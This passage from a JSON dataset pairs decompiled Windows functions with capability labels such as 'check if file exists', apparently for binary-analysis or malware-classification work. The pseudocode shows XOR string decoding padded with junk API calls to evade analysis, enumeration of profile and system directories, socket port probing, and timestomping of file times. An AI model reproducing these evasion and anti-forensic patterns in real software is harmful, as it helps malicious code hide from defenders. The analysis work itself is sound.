        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040bf6b(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    int32_t lpString2;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t hFindFile;\n    int16_t *var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uchar *ARG_0;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t dwBytes;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_cch = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_64h = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_64h,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_64h;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_64h, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_58h = 0x6c784a3f;\n                var_54h = 0x5260637f;\n                var_50h._0_2_ = 0x516c;\n                var_44h = 0x6c524a63;\n                var_40h._0_1_ = 0x51;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_c4h = 5;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetInputState)();\n                    if (iVar7 != 0xfe13c1) {\n                        *(iVar10 + puVar6) = *(&var_44h + iVar10 % var_c4h) ^ (iVar10 + puVar6)[&var_58h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_5ch = 0x64596658;\n                    var_78h = 0x64596676;\n                    var_74h._0_2_ = 0x6265;\n                    var_80h = 0x62547a4a;\n                    var_7ch._0_2_ = 0x6479;\n                    var_70h = 0x627a7a64;\n                    var_6ch._0_1_ = 0x79;\n                    var_60h = 6;\n                    do {\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        lpString2 = iVar10;\n                        var_3ch = &var_5ch - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                            if (iVar8 != 0xbb8767) {\n                                *(iVar7 + iVar10) = *(&var_78h + iVar7 % var_60h) ^ (iVar7 + iVar10)[&var_5ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_44h = iVar10;\n                        var_3ch = &var_80h - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x64ff55) {\n                                *(iVar7 + iVar10) = *(&var_70h + iVar7 % var_c4h) ^ (iVar7 + iVar10)[&var_80h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_30h = 0x56234c34;\n                            var_2ch = 0x4c194e07;\n                            var_28h = 0x4e445620;\n                            var_24h = 0x56294c2b;\n                            var_20h = 0x4c0c4e10;\n                            var_1ch = 0x4e0a5625;\n                            var_18h = 0x563f4c1f;\n                            var_14h = 0x4c2c4e38;\n                            var_10h = 0x4e095629;\n                            var_ch = 0x564c4c08;\n                            var_88h = 0x564c4c78;\n                            var_84h._0_2_ = 0x4e64;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_3ch = iVar10;\n                            var_8h = &var_30h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                                if (iVar8 != 0x248de) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_88h + iVar7 % var_60h) ^ (iVar7 + iVar10)[&var_30h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_c0h = 0x520a3918;\n                            var_bch = 0x391d3124;\n                            var_b8h = 0x3120521b;\n                            var_b4h = 0x52263938;\n                            var_b0h = 0x39363118;\n                            var_ach = 0x31355219;\n                            var_a8h = 0x52263935;\n                            var_a4h = 0x393c3100;\n                            var_a0h = 0x31245217;\n                            var_9ch._0_2_ = 0x3959;\n                            var_90h = 0x527a3959;\n                            var_8ch._0_2_ = 0x3154;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_d4h = iVar10;\n                            var_8h = &var_c0h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n                                if (iVar8 != 0x2f9b38) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_90h + iVar7 % var_60h) ^ (iVar7 + iVar10)[&var_c0h - iVar10];\n                                }\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_54h = var_3ch;\n                            var_8h = 0;\n                            var_98h = 0x6d687557;\n                            var_94h._0_2_ = 0x5956;\n                            var_58h = iVar10;\n                            do {\n                                var_38h = 0x6d1b7572;\n                                var_34h = 0x7572590a;\n                                var_30h = 0x590a6d1b;\n                                var_2ch = 0x6d1b7572;\n                                var_28h = 0x7522590a;\n                                var_24h = 0x593c6d19;\n                                var_20h = 0x6d037534;\n                                var_1ch = 0x75305933;\n                                var_18h = 0x593e6d1d;\n                                var_14h = 0x6d46753b;\n                                var_10h = 0x753a5922;\n                                var_ch = 0x59566d18;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_d0h = &var_38h - iVar10;\n                                do {\n                                    iVar8 = (*pcVar14)();\n                                    if (iVar8 != 0xe2bfcd) {\n                                        *(iVar7 + iVar10) = *(&var_98h + iVar7 % var_60h) ^ (iVar7 + iVar10)[var_d0h];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar10, var_64h, &lpString1, (&var_58h)[var_8h])\n                                ;\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(ARG_0);\n                                if (iVar7 != -1) {\n                                    fcn.0040e360();\n                                    var_cch = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                var_8h = var_8h + 1;\n                            } while (var_8h < 2);\n                            uVar3 = (*pcVar14)(0, var_d4h);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_3ch);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_44h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_64h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_cch;\n}\n",
        "token_count": 3846
    },
    "0040c58e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c58e(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040f779(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.004052ed();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 398
    },
    "0040c76a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040c76a(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x0040ca2b;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x39616c6e;\n        var_44h = 0x4b093240;\n        var_40h = 0x6c576e41;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x394b;\n        var_34h = 0x394b6c32;\n        var_30h._0_1_ = 0x6e;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0x9c1d87) {\n                var_18h = 5;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 5) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x0040c9fd:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.0040b2d1();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.0040b2d1();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040c9fd;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x0040ca2b:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1985
    },
    "0040d1f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d1f0(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uVar8;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uVar7 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40d211;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uVar2 = (*_sym.imp.WS2_32.dll_socket)(2);\n    if (uVar2 != 0xffffffff) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar7 = iVar3 + 2000U & 0xffff;\n        uVar2 = 0;\n        if (uVar7 < 64000) {\n            uVar8 = 0x69604a5f;\n            puStack476 = 0x58304750;\n            do {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                uVar7 = uVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    if (iVar5 != 0x57d7b6) {\n                        *(iVar6 + iVar3) = (&stack0xfffffe18)[iVar6 % 6] ^ (iVar6 + iVar3)[&stack0xfffffe20 + -iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.WS2_32.dll_inet_addr)(iVar3);\n                uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(uVar7);\n                uVar8 = CONCAT22(uVar1, 2);\n                iVar6 = (*_sym.imp.WS2_32.dll_bind)(0x5801, &stack0xfffffe30, 0x10);\n                if (iVar6 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(0x5801);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar7 = uVar7 + 1;\n                uVar2 = 0;\n            } while (uVar7 < 64000);\n        }\n    }\n    return uVar2 & 0xffff0000 | uVar7 & 0xffff;\n}\n",
        "token_count": 711
    },
    "0040dca6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dca6(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040dc34();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040dd48;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040dd48;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040dd48:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 608
    },
    "0040dd8a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040dd8a(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    uint var_8h;\n    \n    iVar3 = *0x41dd60;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    var_8h = 0x3b;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar7 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x66106170;\n    var_58h._0_2_ = 0x6439;\n    var_58h._2_1_ = var_8h;\n    stack0xffffffa7 = 0x39660361;\n    var_51h = 0x42612764;\n    var_4dh = 0x26640c66;\n    var_49h = 0x23661e61;\n    var_45h = 0x2612164;\n    var_41h = 0x66643d66;\n    var_3dh = 0xc665561;\n    var_39h = 0xa613664;\n    var_35h = 0x7b643466;\n    var_31h = 0x28660261;\n    var_2dh = 0x67613064;\n    var_29h = 0x66;\n    var_18h = 0x66676155;\n    var_14h._0_2_ = 0x6450;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0xb0b352) {\n            var_8h = 6;\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.0040dc34();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1348
    },
    "0040dfbd": {
        "rules": [
